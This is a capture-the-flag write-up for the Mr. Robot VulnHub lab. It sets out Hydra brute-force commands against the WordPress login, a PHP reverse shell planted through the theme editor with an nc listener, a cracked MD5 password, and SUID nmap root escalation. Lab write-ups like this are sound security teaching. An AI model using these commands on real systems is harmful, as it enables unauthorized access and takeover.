# Mr. Robot — VulnHub Writeup

**Platform:** VulnHub / TryHackMe  
**Difficulty:** Medium  
**Goal:** Find all 3 keys  
**Techniques:** robots.txt enumeration, custom wordlist, Hydra brute force, WordPress theme editor reverse shell, MD5 hash cracking, SUID nmap privilege escalation

---

## Table of Contents

1. [Port Scanning](#1-port-scanning)
2. [Web Enumeration — robots.txt](#2-web-enumeration--robotstxt)
3. [Wordlist Preparation](#3-wordlist-preparation)
4. [WordPress Enumeration](#4-wordpress-enumeration)
5. [Brute Forcing WordPress — Username Discovery](#5-brute-forcing-wordpress--username-discovery)
6. [Brute Forcing WordPress — Password Discovery](#6-brute-forcing-wordpress--password-discovery)
7. [Reverse Shell via Theme Editor](#7-reverse-shell-via-theme-editor)
8. [Key 1](#8-key-1)
9. [Lateral Movement — user robot](#9-lateral-movement--user-robot)
10. [Key 2](#10-key-2)
11. [Privilege Escalation — SUID nmap](#11-privilege-escalation--suid-nmap)
12. [Key 3](#12-key-3)
13. [Keys Summary](#13-keys-summary)
14. [Key Takeaways](#14-key-takeaways)

---

## 1. Port Scanning

```bash
nmap -sV -sC -p- 10.48.129.99
```

**Key results:**

| Port | Service | Details |
|------|---------|---------|
| 80   | HTTP    | Apache — WordPress site |
| 443  | HTTPS   | Apache |

---

## 2. Web Enumeration — robots.txt

Always check `robots.txt` early — it often leaks sensitive paths.

```bash
curl http://10.48.129.99/robots.txt
```

**Output:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two files exposed: a custom wordlist and **Key 1** directly in robots.txt.

Download the wordlist:

```bash
curl http://10.48.129.99/fsocity.dic -o fsocity.dic
```

---

## 3. Wordlist Preparation

Check the wordlist size:

```bash
wc -l fsocity.dic
```

It's massive — full of duplicates. Deduplicate it before using with Hydra, otherwise brute forcing will take forever:

```bash
sort -u fsocity.dic -o fsocity.dic
wc -l fsocity.dic
```

Significant reduction in size. Much faster to work with now.

---

## 4. WordPress Enumeration

Confirm WordPress is running and find key paths:

```bash
nmap --script=http-enum.nse 10.48.129.99
```

WordPress login panel confirmed at `/wp-login.php`.

---

## 5. Brute Forcing WordPress — Username Discovery

WordPress leaks whether a username exists or not through different error messages. Exploit this to find valid usernames first using the `fsocity.dic` wordlist:

```bash
hydra -t 64 -L fsocity.dic -p test 10.48.129.99 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
```

- `-L fsocity.dic` — use wordlist for usernames
- `-p test` — dummy password (we only care about username here)
- Failure string: `Invalid username` — Hydra stops when this disappears

**Valid username found:** `elliot`

---

## 6. Brute Forcing WordPress — Password Discovery

Now fix the username and brute force the password:

```bash
hydra -t 64 -l elliot -P fsocity.dic 10.48.129.99 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

- `-l elliot` — fixed username
- `-P fsocity.dic` — wordlist for passwords
- Failure string: `The password you entered`

**Credentials found:**
```
login: elliot
password: ER28-0652
```

---

## 7. Reverse Shell via Theme Editor

Log into WordPress at `http://10.48.129.99/wp-login.php` with `elliot:ER28-0652`.

Navigate to:
```
Appearance → Editor → 404.php (or any active template file)
```

Replace the content with a PHP reverse shell from:
```
/usr/share/webshells/php/php-reverse-shell.php
```

Update the IP and port in the shell:
```php
$ip = '192.168.x.x';  // your Kali IP
$port = 4444;
```

Start a listener:
```bash
nc -lnvp 4444
```

Trigger the shell by visiting a non-existent page to hit the 404 template:
```
http://10.48.129.99/404notfound
```

**Shell received.**

Stabilize it:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 8. Key 1

Key 1 was already found in `robots.txt`:

```bash
curl http://10.48.129.99/key-1-of-3.txt
```

**Key 1 retrieved.**

---

## 9. Lateral Movement — user robot

Check the home directory:

```bash
ls /home/robot
```

Two files: `key-2-of-3.txt` and `password.raw-md5`

The key file is only readable by `robot`. Read the MD5 hash file:

```bash
cat /home/robot/password.raw-md5
```

**Hash:** `c3fcd3d76192e4007dfb496cca67e13b`

Crack it — this is a well-known MD5 hash:

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
```

> The hash cracked to the full lowercase alphabet. Can also be cracked offline with hashcat/john or identified instantly on CrackStation.

---

## 10. Key 2

Now as `robot`, read the second key:

```bash
cat /home/robot/key-2-of-3.txt
```

**Key 2 retrieved.**

---

## 11. Privilege Escalation — SUID nmap

Find SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Notable result:** `/usr/local/bin/nmap`

Old versions of nmap (3.x) had an `--interactive` mode that allows shell execution. Check GTFOBins for the exact method:

```bash
nmap --interactive
```

Inside the nmap prompt:

```
!sh
```

Or:

```
!/bin/sh
```

**Root shell obtained.**

---

## 12. Key 3

```bash
cd /root
ls
cat key-3-of-3.txt
```

**Key 3 retrieved. Machine complete.**

---

## 13. Keys Summary

| Key | Location | Method |
|-----|----------|--------|
| Key 1 | `/key-1-of-3.txt` | robots.txt enumeration |
| Key 2 | `/home/robot/key-2-of-3.txt` | MD5 hash crack → su robot |
| Key 3 | `/root/key-3-of-3.txt` | SUID nmap --interactive |

---

## 14. Key Takeaways

- **robots.txt is not just for SEO** — it regularly leaks sensitive files and directories. Always check it manually and with tools.
- **Deduplicate wordlists** — `sort -u` before any brute force saves enormous time. `fsocity.dic` had thousands of duplicates.
- **WordPress error messages are your friend** — different messages for invalid username vs wrong password is a classic information disclosure that makes two-phase Hydra attacks possible.
- **Theme editors = RCE** — any CMS admin panel with a file editor is essentially a webshell waiting to happen.
- **SUID binaries are always worth checking** — `find / -perm -u=s -type f 2>/dev/null` should be muscle memory. Old nmap's `--interactive` mode is a classic privesc that comes up in interviews.
- **GTFOBins** — bookmark it. Any SUID binary, sudo permission, or capability has a corresponding privesc method documented there.

---

*Machine completed by Shahid | [GitHub](https://github.com/Shahid-git-09/vulnhub-writeups)*
